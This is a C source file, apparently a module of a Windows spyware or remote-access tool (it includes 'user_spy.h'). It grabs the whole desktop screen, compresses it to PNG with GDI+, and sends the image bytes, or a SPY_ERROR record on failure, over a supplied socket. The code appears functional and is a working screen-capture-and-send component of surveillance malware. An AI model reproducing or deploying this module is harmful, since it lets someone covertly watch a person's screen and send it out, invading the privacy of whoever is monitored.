#include "user_spy.h"

int GetEncoderClsid(const WCHAR * format, CLSID * pClsid)
{
	UINT num = 0;	// number of image encoders
	UINT size = 0;	// size of the image encoder array in bytes

	ImageCodecInfo *pImageCodecInfo = NULL;

	GdipGetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;	// Failure

	pImageCodecInfo = GdipAlloc(size);
	if (pImageCodecInfo == NULL)
		return -1;	// Failure

	GdipGetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			GdipFree(pImageCodecInfo);
			return j;	// Success
		}
	}

	GdipFree(pImageCodecInfo);
	return -1;	// Failure
}



BOOL Compress_and_Send(HBITMAP bitmap,SOCKET sock,PDWORD reason)
{
    GpBitmap * gdibtm = NULL;
    LPSTREAM stream = NULL;
    HGLOBAL global ; LPVOID buf;GdiplusStartupInput input;UINT_PTR token = 0;CLSID image_guid;
    BOOL Success = 1;

    ZeroMemory(&input,sizeof(input));
    input.GdiplusVersion = 1;

    if(GdiplusStartup(&token,&input,NULL))
    {
        *reason = GetLastError();
        return 0;
    }

    if(CreateStreamOnHGlobal(NULL,1,&stream))
    {
       Success = 0;
        goto __CleanUp;
    }

    if(GdipCreateBitmapFromHBITMAP(bitmap,NULL,&gdibtm))
    {
        Success = 0;
        goto __CleanUp;
    }

    if(GetEncoderClsid(L"image/png",&image_guid)==-1)
    {
        Success = 0;
        goto __CleanUp;
    }

    if(GdipSaveImageToStream(gdibtm,stream,&image_guid,NULL))
    {
        Success = 0;
        goto __CleanUp;
    }

    GetHGlobalFromStream(stream,&global);
    buf = GlobalLock(global);
    DWORD size = GlobalSize(global);

    send(sock,(char *)&size,4,0); //sending Image Size
    send(sock,(char *) buf,size,0); // Sending Image DATA

    GlobalUnlock(global);


    __CleanUp:
        if(!Success)
        {
            *reason = GetLastError();
        }
        if(stream)
        {
            (stream)->lpVtbl->Release(stream);
        }
        if(gdibtm)
        {
            GdipDisposeImage(gdibtm);
        }
        if(token)
        {
            GdiplusShutdown(token);
        }

        return Success;
}


void ScreenShot(SOCKET sock)
{
    HDC hdc,memdc ;
    HBITMAP bitmap ,old ;
    RECT r;
    HWND window;
    SPY_ERROR err={404,0};

    //SetProcessDPIAware();

    window = GetDesktopWindow();

    GetWindowRect(window,&r);

    hdc = GetDC(window);
    memdc = CreateCompatibleDC(hdc);
    bitmap  = CreateCompatibleBitmap(hdc,r.right,r.bottom);
    old = SelectObject(memdc,bitmap);
    if(!BitBlt(memdc,0,0,r.right,r.bottom,hdc,0,0,SRCCOPY))
    {
        err.code = 0;
    }

    if(err.code != 0)
    {

        if(!Compress_and_Send(bitmap,sock,&err.reason))
        {
            err.code = 0;
        }

    }

    if(err.code == 0)
    {
        if(err.reason == 0)
            err.reason = GetLastError();
         send(sock,(char *)&err,sizeof(err),0);
    }

    DeleteObject(bitmap);
    SelectObject(memdc,old);
    DeleteObject(memdc);
    ReleaseDC(window,hdc);
    CloseWindow(window);
    return ;
}
